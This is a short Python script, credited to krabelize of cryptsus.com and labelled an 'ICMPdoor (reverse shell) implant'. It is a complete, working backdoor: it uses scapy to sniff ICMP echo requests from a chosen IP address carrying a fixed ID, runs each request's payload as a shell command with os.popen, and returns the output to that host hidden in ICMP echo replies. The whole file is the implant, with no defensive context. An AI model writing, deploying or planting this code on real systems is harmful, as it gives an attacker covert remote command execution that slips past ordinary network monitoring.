#!/usr/bin/python3
#By krabelize | cryptsus.com
#ICMPdoor (reverse shell) implant
from scapy.all import *
import argparse
import os

#Variables
icmp_id = int(13170)

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
        newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(newpkt).readlines()
        icmppacket = (IP(dst=args.destination_ip)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass
    
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
